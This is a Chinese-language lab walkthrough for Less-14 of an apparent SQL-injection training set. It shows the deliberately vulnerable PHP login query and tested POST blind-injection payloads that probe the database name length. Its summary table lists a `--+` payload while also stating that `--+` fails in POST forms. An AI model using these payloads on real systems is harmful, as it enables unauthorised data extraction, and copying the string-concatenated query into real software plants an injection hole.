# Less-14

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 盲注 |
| **闭合方式** | `"` |
| **注释符** | `# · POST 表单必须用它，--+ 会失效` |
| **成败信号** | flag.jpg / slap.jpg |
| **一句话** | 同上 |
| **核心 payload** | `uname=admin" and length(database())=8--+` |

---

**POST · 盲注 · 双引号**

### 源码

```php
$uname  = '"' . $uname  . '"';
$passwd = '"' . $passwd . '"';
$sql = "SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
```

闭合用 **`"`**（注意这里没有括号）。

### 通关 payload（实测）

```
uname = admin"#                            →  flag.jpg
uname = admin" and length(database())=8#    →  flag.jpg  （真）
uname = admin" and length(database())=9#    →  slap.jpg  （假）
```

---

[← Less-13](Less-13.md) ｜ [返回目录](README.md) ｜ [Less-15 →](Less-15.md)